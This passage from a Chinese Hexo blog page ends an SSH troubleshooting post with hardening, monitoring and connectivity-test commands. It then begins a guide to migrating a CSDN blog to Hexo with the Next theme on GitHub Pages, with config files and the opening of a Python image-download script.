<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen              <span class="comment"># 生成密钥对</span></span><br><span class="line">ssh-copy-id user@server <span class="comment"># 上传公钥到服务器</span></span><br></pre></td></tr></table></figure>
<p>禁用密码认证（<code>/etc/ssh/sshd_config</code>）：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication no</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>调整登录限制</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 增加最大连接尝试次数</span></span><br><span class="line">MaxAuthTries 6</span><br><span class="line"><span class="comment"># 设置登录超时</span></span><br><span class="line">LoginGraceTime 30s</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="6-监控与告警"><a href="#6-监控与告警" class="headerlink" title="6.监控与告警"></a><code>6.监控与告警</code></h4><ol>
<li><p><strong>实时监控连接状态</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch -n 1 <span class="string">&#x27;ss -tunap | grep ssh&#x27;</span>  <span class="comment"># 实时查看SSH连接</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>日志分析工具</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">journalctl -u sshd -f  <span class="comment"># 实时查看SSH服务日志</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>告警机制</strong>  </p>
<ul>
<li>配置服务器监控工具（如Prometheus+Grafana），当SSH连接异常时发送通知。</li>
</ul>
</li>
</ol>
<h4 id="7-特殊场景解决方案"><a href="#7-特殊场景解决方案" class="headerlink" title="7.特殊场景解决方案"></a><code>7.特殊场景解决方案</code></h4><ol>
<li><p><strong>高延迟网络</strong>  </p>
<ul>
<li>降低TCP窗口缩放：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 客户端临时设置</span></span><br><span class="line"><span class="built_in">sudo</span> sysctl -w net.ipv4.tcp_window_scaling=0</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>跨时区时钟同步</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install ntp    <span class="comment"># 安装NTP服务</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl restart ntp</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="8-测试与验证"><a href="#8-测试与验证" class="headerlink" title="8.测试与验证"></a><code>8.测试与验证</code></h4><ol>
<li><p><strong>网络连通性测试</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping server             <span class="comment"># 测试网络可达性</span></span><br><span class="line">traceroute server       <span class="comment"># 追踪路由路径</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>端口可用性测试</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -zv server 22        <span class="comment"># 测试SSH端口连通性</span></span><br></pre></td></tr></table></figure></li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zq-rookie-hacker.github.io/2024/09/10/Blog-Building/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/zhuzhuxia.jpg">
      <meta itemprop="name" content="ZQ-Rooie-Hacker">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/Blog-Building/" class="post-title-link" itemprop="url">Blog-Building</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-09-10 12:00:00" itemprop="dateCreated datePublished" datetime="2024-09-10T12:00:00+08:00">2024-09-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-11-11 10:30:00" itemprop="dateModified" datetime="2024-11-11T10:30:00+08:00">2024-11-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/" itemprop="url" rel="index"><span itemprop="name">知识杂碎</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>3.3k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>11 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="从CSDN迁移博客到Hexo-Next-GitHub-Pages"><a href="#从CSDN迁移博客到Hexo-Next-GitHub-Pages" class="headerlink" title="从CSDN迁移博客到Hexo+Next+GitHub Pages"></a>从CSDN迁移博客到Hexo+Next+GitHub Pages</h1><p>本指南专为「从CSDN导出博客，部署到Hexo+Next主题GitHub Pages」的用户设计，全面解决：</p>
<ul>
<li>CSDN导出图片不显示问题</li>
<li>Hexo配置错误导致部署失败</li>
<li>路径解析和缓存冲突</li>
<li>GitHub Pages部署疑难杂症</li>
<li>博客结构混乱、功能缺失、体验不佳</li>
</ul>
<h1 id="一、环境准备与项目初始化"><a href="#一、环境准备与项目初始化" class="headerlink" title="一、环境准备与项目初始化"></a>一、环境准备与项目初始化</h1><p><strong>1.1 必备环境安装</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装Node.js（必需v14+，推荐v18+）</span></span><br><span class="line"><span class="comment"># 官网下载：https://nodejs.org/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装Git</span></span><br><span class="line"><span class="comment"># 官网下载：https://git-scm.com/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证安装</span></span><br><span class="line">node --version</span><br><span class="line">npm --version</span><br><span class="line">git --version</span><br></pre></td></tr></table></figure>

<p><strong>1.2 GitHub仓库准备</strong></p>
<ul>
<li>创建一个名为 <code>你的用户名.github.io</code> 的仓库（必须是此格式）。</li>
<li><strong>推荐</strong>：配置SSH密钥以实现免密推送。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;your_email@example.com&quot;</span></span><br><span class="line"><span class="comment"># 将 ~/.ssh/id_rsa.pub 内容添加到 GitHub 的 SSH Keys 设置中</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>1.3 Hexo项目初始化</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装Hexo命令行工具</span></span><br><span class="line">npm install -g hexo-cli</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建博客项目</span></span><br><span class="line">hexo init myBlog</span><br><span class="line"><span class="built_in">cd</span> myBlog</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装Next主题</span></span><br><span class="line">npm install hexo-theme-next --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装部署插件</span></span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装搜索插件（用于本地搜索）</span></span><br><span class="line">npm install hexo-generator-searchdb --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装站点地图插件（用于SEO）</span></span><br><span class="line">npm install hexo-generator-sitemap --save</span><br><span class="line">npm install hexo-generator-baidu-sitemap --save  <span class="comment"># 可选，百度专用</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="二、核心配置文件详解"><a href="#二、核心配置文件详解" class="headerlink" title="二、核心配置文件详解"></a>二、核心配置文件详解</h1><p><strong>2.1 Hexo主配置文件 (<code>_config.yml</code>)</strong></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">ZQ-Rookie-Hacker的技术博客</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;分享编程、网络安全、工具使用技巧&#x27;</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27;专注于Hexo博客搭建、前端开发、网络安全的技术分享平台&#x27;</span></span><br><span class="line"><span class="attr">keywords:</span> [<span class="string">&#x27;Hexo&#x27;</span>, <span class="string">&#x27;博客搭建&#x27;</span>, <span class="string">&#x27;网络安全&#x27;</span>, <span class="string">&#x27;SSH&#x27;</span>, <span class="string">&#x27;编程技巧&#x27;</span>]</span><br><span class="line"><span class="attr">author:</span> <span class="string">ZQ-Rookie-Hacker</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://你的用户名.github.io</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">external_link:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span></span><br><span class="line">  <span class="attr">exclude:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span>  <span class="comment"># 🔑 关键：启用文章资源文件夹（每篇文章一个文件夹存放图片）</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span>     <span class="comment"># 🔑 关键：禁用相对链接，确保路径正确</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Markdown配置（解决图片核心问题）</span></span><br><span class="line"><span class="attr">syntax_highlighter:</span> <span class="string">highlight.js</span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hljs:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">marked:</span></span><br><span class="line">  <span class="attr">prepend_root:</span> <span class="literal">true</span>    <span class="comment"># 🔑 关键：自动为相对路径添加根路径</span></span><br><span class="line">  <span class="attr">post_asset:</span> <span class="literal">true</span>      <span class="comment"># 🔑 关键：识别文章资源文件夹中的图片</span></span><br><span class="line"></span><br><span class="line"><span class="attr">prismjs:</span></span><br><span class="line">  <span class="attr">preprocess:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭缓存避免路径问题</span></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:你的用户名/你的用户名.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure>

<p><strong>2.2 Next主题配置 (<code>themes/next/_config.yml</code>)</strong></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Scheme Settings (推荐简洁大气的Gemini或Mist)</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Gemini</span></span><br><span class="line"><span class="comment"># scheme: Mist</span></span><br><span class="line"><span class="comment"># scheme: Pisces</span></span><br><span class="line"><span class="comment"># scheme: Muse</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dark Mode</span></span><br><span class="line"><span class="attr">darkmode:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Menu Settings</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-folder</span>  <span class="comment"># 新增：分类页</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span>              <span class="comment"># 新增：标签页</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span>            <span class="comment"># 可选：需先创建about页</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sidebar Settings</span></span><br><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">left</span></span><br><span class="line">  <span class="attr">display:</span> <span class="string">post</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Post Settings</span></span><br><span class="line"><span class="attr">excerpt_description:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">read_more_btn:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 图片懒加载（提升加载速度）</span></span><br><span class="line"><span class="attr">lazyload:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码高亮优化</span></span><br><span class="line"><span class="attr">codeblock:</span></span><br><span class="line">  <span class="attr">copy_button:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地搜索</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">placeholder:</span> <span class="string">搜索文章...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 阅读量统计（不蒜子）</span></span><br><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">archive_views:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 评论系统（推荐Gitalk）</span></span><br><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">client_id:</span> <span class="string">你的Client</span> <span class="string">ID</span></span><br><span class="line">  <span class="attr">client_secret:</span> <span class="string">你的Client</span> <span class="string">Secret</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">blog-comments</span>  <span class="comment"># 用于存储评论的GitHub仓库名</span></span><br><span class="line">  <span class="attr">owner:</span> <span class="string">你的GitHub用户名</span></span><br><span class="line">  <span class="attr">admin:</span> [<span class="string">你的GitHub用户名</span>]</span><br><span class="line">  <span class="attr">distraction_free_mode:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SEO</span></span><br><span class="line"><span class="attr">seo:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="三、CSDN图片处理终极方案"><a href="#三、CSDN图片处理终极方案" class="headerlink" title="三、CSDN图片处理终极方案"></a>三、CSDN图片处理终极方案</h1><p><strong>3.1 自动化图片下载与修复脚本 (<code>fix_csdn_images.py</code>)</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====== 你只需要改这一行：你的文章放哪儿？ ======</span></span><br><span class="line">POSTS_DIR = <span class="string">r&quot;F:\myBlog\source\_posts&quot;</span>  <span class="comment"># 修改为你的实际路径</span></span><br><span class="line"><span class="comment"># ================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持的图片格式</span></span><br><span class="line">IMG_EXTENSIONS = (<span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.gif&#x27;</span>, <span class="string">&#x27;.bmp&#x27;</span>, <span class="string">&#x27;.webp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_image</span>(<span class="params">url, save_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;下载单张图片&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.get(url, headers=headers, timeout=<span class="number">15</span>)</span><br><span class="line">        res.raise_for_status()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(save_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(res.content)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 下载失败：<span class="subst">&#123;url&#125;</span>，错误：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_markdown_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;处理单个Markdown文件&quot;&quot;&quot;</span></span><br><span class="line">    article_name = os.path.splitext(os.path.basename(file_path))[<span class="number">0</span>]</span><br><span class="line">    image_dir = os.path.join(os.path.dirname(file_path), article_name)</span><br><span class="line">    os.makedirs(image_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查找所有CSDN网络图片链接</span></span><br><span class="line">    img_pattern = <span class="string">r&#x27;!\[([^\]]*)\]\((https?://[^\s)]+\.(?:png|jpg|jpeg|gif|bmp|webp))\)&#x27;</span></span><br><span class="line">    matches = <span class="built_in">list</span>(re.finditer(img_pattern, content))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;🔍 找到 <span class="subst">&#123;<span class="built_in">len</span>(matches)&#125;</span> 张图片&quot;</span>)</span><br><span class="line"></span><br><span class="line">    success_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, <span class="keyword">match</span> <span class="keyword">in</span> <span class="built_in">enumerate</span>(matches):</span><br><span class="line">        alt_text = <span class="keyword">match</span>.group(<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;图片描述&#x27;</span></span><br><span class="line">        url = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;⬇️ 正在下载 (<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(matches)&#125;</span>): <span class="subst">&#123;os.path.basename(url)&#125;</span> &quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 生成图片文件名</span></span><br><span class="line">        parsed = urlparse(url)</span><br><span class="line">        ext = os.path.splitext(parsed.path)[<span class="number">1</span>].lower()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ext <span class="keyword">or</span> ext <span class="keyword">not</span> <span class="keyword">in</span> IMG_EXTENSIONS:</span><br><span class="line">            ext = <span class="string">&#x27;.png&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 清理文件名中的特殊字符</span></span><br><span class="line">        clean_alt = re.sub(<span class="string">r&#x27;[^\w\u4e00-\u9fa5-]&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, alt_text)</span><br><span class="line">        filename_on_disk = <span class="string">f&quot;<span class="subst">&#123;clean_alt&#125;</span>_<span class="subst">&#123;i+<span class="number">1</span>&#125;</span><span class="subst">&#123;ext&#125;</span>&quot;</span> <span class="keyword">if</span> clean_alt <span class="keyword">else</span> <span class="string">f&quot;image_<span class="subst">&#123;i+<span class="number">1</span>&#125;</span><span class="subst">&#123;ext&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        local_path = os.path.join(image_dir, filename_on_disk)</span><br><span 